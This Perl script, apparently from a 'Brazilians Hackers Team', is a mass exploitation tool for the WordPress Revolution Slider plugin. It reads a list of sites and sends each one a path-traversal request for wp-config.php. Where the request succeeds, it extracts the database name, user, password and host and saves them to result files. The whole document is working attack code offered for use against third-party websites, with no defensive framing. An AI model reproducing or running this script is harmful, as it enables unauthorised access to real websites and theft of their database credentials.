#!/usr/bin/perl
# *** Brazilians Hackers Team ***
# By ./ChmoD
# use Win32::Console::ANSI; ---> tirar # caso esteja no windows 
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
 
####################### LIMPAR O TERMINAL ############################################
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
####################### TITULO DO TERMINAL ###########################################
system("title [MASS REVSLIDER GET CONFIG] [ By ./ChmoD]");
####################### DISCRIÇÃO ####################################################
my $script = '[ MASS REVSLIDER ]';
my $author = './ChmoD';
my $team = '*** Brazilians Hackers Team ***';
my $update = '05/06/2017';
my $greetz = 'All friends';
####################### CRIANDO O DIRETORIO RESULT PARA SALVAR OS .TXT ###############
$res="Result";
    if (-e $res) 
    {
    }
    else
    {
        mkdir $res or die "NAO CONSEGUIMOS CRIAR O DIRETORIO: $res";
    }
################# INICIO  #############
 
print "\n";
 
 
print colored("      ▒▒▒▒▒▒▒▓ ",'BOLD RED'), "\n";
print colored("      ▒▒▒▒▒▒▒▓▓▓ ",'BOLD RED'), "\n";
print colored("      ▒▓▓▓▓▓▓░░░▓ ",'BOLD RED'), "\n";
print colored("      ▒▓░░░░▓░░░░▓",'BOLD RED'), "\n";
print colored("      ▓░░░░░░▓░▓░▓ ",'BOLD RED'), "\n";
print colored("      ▓░░░░░░▓░░░▓ ",'BOLD RED'), "\n";
print colored("      ▓░░▓░░░▓▓▓▓ ",'BOLD RED'), "\n";
print colored("      ▒▓░░░░▓▒▒▒▒▓",'BOLD RED'), "\n";
print colored("      ▒▒▓▓▓▓▒▒▒▒▒▓ ",'BOLD RED'), "\n";
print colored("      ▒▒▒▒▒▒▒▒▓▓▓▓ ",'BOLD RED'), "\n";
print colored("      ▒▒▒▒▒▓▓▓▒▒▒▒▓ ",'BOLD RED'), "\n";
print colored("      ▒▒▒▒▓▒▒▒▒▒▒▒▒▓ ",'BOLD RED'), "\n";
print colored("      ▒▒▒▓▒▒▒▒▒▒▒▒▒▓",'BOLD RED'), "\n";
print colored("      ▒▒▓▒▒▒▒▒▒▒▒▒▒▒▓ ",'BOLD RED'), "\n";
print colored("      ▒▓▒▓▒▒▒▒▒▒▒▒▒▓ ",'BOLD RED'), "\n";
print colored("      ▒▓▒▓▓▓▓▓▓▓▓▓▓ ",'BOLD RED'), "\n";
print colored("      ▒▓▒▒▒▒▒▒▒▓ ",'BOLD RED'), "\n";
print colored("      ▒▒▓▒▒▒▒▒▓ ",'BOLD RED'), "\n";
print "\n";
print colored(" +---**---==[ $script ]==---**--+ ",'BOLD YELLOW'), "\n";
print "\n";
########## PART WORK #################
print colored("[Digite Sua Lista]: ",'BOLD GREEN'), "";
chomp(my $lista=<STDIN>);
open (my $lista,'<',$lista) || die "\n [Lista Nao Encontrada]";
my @lista = <$lista>;
 
foreach $site(@lista) {
 
if($site !~ /http:\/\//) { $site = "http://$site/"; };
getconfig ();
}
sub getconfig{
################################# CHECANDO SE VULN ########################
print colored ("\nTestando Site --->  $site",'BOLD BLUE'),"\n";
 
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
 
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
 
################################## GET INFO #################################
if($conttt =~ m/DB_NAME/g){
print colored ("[VULNERAVEL]",'BOLD GREEN'),"\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "[rev cnfg] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
print colored ("[Extraindo Informacao]",'BOLD GREEN'),"\n";
while($cont =~ m/DB_NAME/g){
 
 
        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print color("BOLD RED"),"[-]Database Name = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print color("BOLD BOLD WHITE"),"[-]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print color("BOLD RED"),"[-]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print color("BOLD WHITE"),"[-]Database Host = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }
 
}
############################### NÃO VULN #############################
}else{
print colored ("[NAO VULNERAVEL]",'BOLD RED'),"";
 
 
}
 
}
